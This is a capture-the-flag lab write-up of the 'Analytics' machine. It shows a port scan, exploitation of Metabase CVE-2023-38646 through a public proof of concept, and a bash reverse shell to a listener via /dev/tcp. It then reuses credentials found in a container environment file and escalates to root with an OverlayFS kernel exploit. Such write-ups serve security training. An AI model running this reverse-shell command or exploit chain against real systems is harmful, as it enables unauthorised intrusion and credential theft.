---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Analytics

## Enumeration

### Nmap

```
└─$ nmap -sV 10.129.138.125                     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 11:31 EDT
Nmap scan report for 10.129.138.125
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```

## Web (80 TCP)

Add `analytical.htb` to `/etc/hosts`. There is also a subdomain `data.analytical.htb`, which is redirecred to by clicking on Login button.

### data.analytical.htb

homepage of Metabase. Search for `metabase exploit` returned https://pentest-tools.com/vulnerabilities-exploits/metabase-remote-code-execution_CVE-2023-38646: candidate to try! Version in source code (`version":{"date":"2023-06-29","tag":"v0.46.6"`) matches the affected versions.

#### Working POC

https://github.com/joaoviictorti/CVE-2023-38646

First download rust

```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

You also might need to install dependencies

```
sudo apt install pkg-config
sudo apt-get install libudev-dev
```

Then execute the exploit

1. Open listener `nc -lvnp 8888`
2. Run it `cargo run -- --url http://data.analytical.htb --command "bash -i >& /dev/tcp/10.10.14.139/8888 0>&1"`

Now you are in. But quick lookaround (e.g. hostname) points it to be a container.

#### Container Escape

In `.env` inside container

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

Or just call `env` as you ARE the process

Now just ssh to the `metalytics` user. and grab the flag

## -> ROOT

Linpeas does not says much. So let's take a look on CVEs List of PoC in github: https://github.com/nomi-sec/PoC-in-GitHub

We tried: CVE-2023-0386: OverlayFS (the kernel version might be vulnerable) CVE-2023-4911: GNU C Library's dynamic loader (verison might be vulnerable) CVE-2023-2640: OverlayFS (the kernel version might be vulnerable)

Finally, the last one, CVE-2023-2640 worked. https://github.com/luanoliveira350/GameOverlayFS Modify it to spawn a shell and execute it. Grab the flag, done.